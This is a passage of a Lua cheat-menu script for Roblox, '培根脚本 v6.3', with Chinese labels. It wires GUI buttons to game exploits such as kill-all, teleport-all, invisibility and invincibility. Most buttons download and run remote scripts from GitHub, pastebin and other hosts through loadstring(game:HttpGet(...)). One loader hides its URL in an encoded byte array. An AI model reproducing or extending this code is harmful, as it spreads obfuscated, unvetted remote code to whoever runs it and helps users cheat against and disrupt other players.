        FESwordButton = function() loadExternalScript("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Neptunian%20V", "FE圣剑") end,
        SpinButton = toggleSpin,
        SpinSpeedButton = changeSpinSpeed,
        WalkAirButton = function() loadExternalScript("https://protected-roblox-scripts.onrender.com/2b33f845cf5c751e52c06abacaeb27e1", "踏空行走") end,
        AutoMoveButton = toggleAutoMove,
        FECrouchButton = function() loadExternalScript("https://raw.githubusercontent.com/Azizanzz0/Scripts/refs/heads/main/Crouching.txt", "FE蹲下") end,
        ClickTeleportButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-Teleport-Tool-25249", "点击传送") end,
        KillAllButton = killAllPlayers,
        TeleportAllButton = teleportAllToMe,
        SitSpinButton = toggleSitSpin,
        RideHeadButton = toggleRideHead,
        ViewBackpackButton = viewPlayerBackpack,
        FEHugButton = function() loadExternalScript("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool", "FE拥抱") end,
        PlayerSizeButton = changePlayerSize,
        RainbowButton = toggleRainbow,
        GlobalRainbowButton = toggleGlobalRainbow,
        GhostButton = toggleGhost,
        InvisibleButton = function() loadExternalScript('https://pastebin.com/raw/3Rnd9rHf', "人物隐形") end,
        GravityButton = changeGravity,
        NightVisionButton = toggleNightVision,
        FECarButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-FE-SILLY-CAR-V1-48227", "FE人物变车") end,
        FESpiderManButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E8%9C%98%E8%9B%9B%E4%BE%A0.txt", "FE蜘蛛侠") end,
        FakeFriendButton = function() loadExternalScript("https://raw.githubusercontent.com/sigmaboy123z/MYFRIENDSCRIPT/refs/heads/main/MYNEWFRIENDSPAWNER", "假朋友") end,
        FER6AnimationsButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-R6-Animations-Menu-By-Me-19427", "FER6动作") end,
        FEHamsterBallButton = function() loadExternalScript("https://raw.githubusercontent.com/KaterHub-Inc/scripts/refs/heads/main/unofficial-Projects/FEHamsterBall.lua", "FE滚蛋") end,
        FEAutoPianoButton = function() loadExternalScript("https://rawscripts.net/raw/Tac's-Piano-Stuff-Talentless-script-made-by-hellohellohell012321-44088", "FE自动弹钢琴") end,
        BlackHoleV6Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V6.txt", "黑洞v6") end,
        BlackHoleV4Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V4.txt", "黑洞v4") end,
        BlackHoleV1Button = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/V1.lua.txt", "黑洞v1") end,
        FEControlNPCButton = function() loadExternalScript("https://raw.githubusercontent.com/randomstring0/fe-source/refs/heads/main/NPC/source/main.Luau", "FE控制NPC") end,
        FEForsakenAnimButton = function() loadExternalScript("https://raw.githubusercontent.com/CyberNinja103/brodwa/refs/heads/main/ForsakationHub", "FE被遗弃动作") end,
        ChatDrawButton = function() loadExternalScript("https://raw.githubusercontent.com/ocfi/_/refs/heads/main/a", "聊天框画画") end,
        FE096Button = function() loadExternalScript("https://github.com/Sinister-Scripts/Roblox-Exploits/raw/refs/heads/main/FE-Animation-GUI-R6", "FE合集") end,
        FEHam00dButton = function() loadExternalScript("https://rawscripts.net/raw/Universal-Script-sb-56309", "fe ham00d菜单") end,
        TrainEffectButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/%E8%B6%8A%E8%B7%91%E8%B6%8A%E5%BF%AB.txt", "火车头效果") end,
        FreePrivateServerButton = function() loadExternalScript("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/Kenny免费私服.lua", "免费私服") end,
        PiScriptButton = function() 
            playClickSound()
            getgenv().XiaoPi = "皮脚本QQ群1002100032"
            loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
            showNotification("皮脚本已加载!", Color3.fromRGB(0, 200, 0))
        end,
        CaodanButton = function() loadExternalScript("https://pastebin.com/raw/hkyuHQ7Y", "操蛋脚本") end,
        ScriptCenterButton = function() 
            playClickSound()
            loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
            showNotification("脚本中心已加载!", Color3.fromRGB(0, 200, 0))
        end,
        HackButton = applyHackEffects,
        UIColorButton = changeUIColor,
        SuicideButton = suicide,
        StealBrainRedButton = loadStealBrainRed,
        GardenButton = loadGarden,
        OhioButton = loadOhio,
        ForsakenButton = loadForsaken,
        ThrowFlyButton = loadThrowFly,
        CatAnimButton = loadCatAnim,
        InvincibleButton = loadInvincible,
        BeatDogButton = loadBeatDog,
        FEAK47Button = loadFEAK47,
        FESniperButton = loadFESniper,
        ChenScriptButton = loadChenScript,
        AIChatButton = loadAIChat  -- 添加AI聊天按钮
    }

    for buttonName, action in pairs(buttonActions) do
        if ButtonInstances[buttonName] then
            ButtonInstances[buttonName].MouseButton1Click:Connect(action)
        end
    end

    -- 启动动画（透明背景）
    local startupFrame = Instance.new("Frame")
    startupFrame.Size = UDim2.new(1, 0, 1, 0)
    startupFrame.BackgroundTransparency = 1 -- 透明背景
    startupFrame.ZIndex = 100
    startupFrame.Parent = ScreenGui
    
    local startupLabel = Instance.new("TextLabel")
    startupLabel.Size = UDim2.new(0, 300, 0, 100) -- 改小尺寸
    startupLabel.Position = UDim2.new(0.5, -150, 0.5, -50)
    startupLabel.BackgroundTransparency = 1
    startupLabel.Text = "培根脚本 v6.3\n加载中..."
    startupLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
    startupLabel.TextSize = 24 -- 减小字体
    startupLabel.Font = Enum.Font.GothamBold
    startupLabel.ZIndex = 101
    startupLabel.Parent = startupFrame

    spawn(function()
        for i = 1, 5 do
            startupLabel.Text = "培根脚本 v6.3\n加载中" .. string.rep(".", i)
            wait(0.5)
        end
        startupLabel.Text = "培根脚本 v6.3\n加载完成!"
        TweenService:Create(startupLabel, TweenInfo.new(1.5), {TextTransparency = 1}):Play()
        wait(1.5)
        startupFrame:Destroy()
        
        MainFrame.Visible = true
        MainFrame.Position = UDim2.new(1.5, -350, 0.5, -225)
        TweenService:Create(MainFrame, TweenInfo.new(0.8), {Position = UDim2.new(0.5, -350, 0.5, -225)}):Play()
        
        showNotification("培根脚本 v6.3 已加载!", Color3.fromRGB(0, 200, 255))
        
        -- 初始设置
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = walkSpeed
            humanoid.JumpPower = jumpPower
        end
        
        selectPlayer()
    end)

    -- 角色重生处理
    LocalPlayer.CharacterAdded:Connect(function()
        wait(2)
        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = walkSpeed
            humanoid.JumpPower = jumpPower
        end
    end)
end

-- 安全执行
local success, err = pcall(loadScript)
if not success then
    warn("脚本加载错误: " .. err)
end
